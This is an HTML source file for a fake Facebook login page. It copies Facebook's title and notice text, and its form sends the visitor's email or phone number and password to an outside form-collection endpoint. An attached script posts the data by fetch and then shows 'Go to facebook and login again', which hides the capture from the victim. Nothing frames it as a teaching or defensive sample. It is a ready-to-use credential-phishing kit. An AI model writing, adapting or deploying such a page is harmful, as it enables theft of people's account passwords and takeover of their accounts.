<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- <title>facebook/login</title> -->
    <link rel="stylesheet" href="style.css">
    <title>Facebook/Login</title>
    <link rel="shortcut icon" href="title.ico.svg" />
</head>

<body>
    <p>Facebook requests and receives your phone number from your mobile network. <a href="#">change settings.

    </a></p>
    <img src="dF5SId3UHWd.svg" alt="">
    <form action="https://formspree.io/f/mdoyzogn" method="POST">
        <label>
            <input type="text" name="_replyto" placeholder="Mobile number or email adress">
        </label>
        <label>
            <input type='password' name="message" placeholder="password">
        </label>

        <!-- your other form fields go here -->

        <button type="Login">Send</button>
    </form>
    <a href="#" class="f">forgotten password?</a>
    <a href="#" class="c">create new account</a>
    <script>
        var form = document.getElementById("my-form");

        async function handleSubmit(event) {
            event.preventDefault();
            var status = document.getElementById("my-form-status");
            var data = new FormData(event.target);
            fetch(event.target.action, {
                method: form.method,
                body: data,
                headers: {
                    'Accept': 'application/json'
                }
            }).then(response => {
                status.innerHTML = "Go to facebook and login again";
                form.reset()
            }).catch(error => {
                status.innerHTML = "Oops! There was a problem with login"
            });
        }
        form.addEventListener("submit", handleSubmit)
    </script>
</body>

</html>
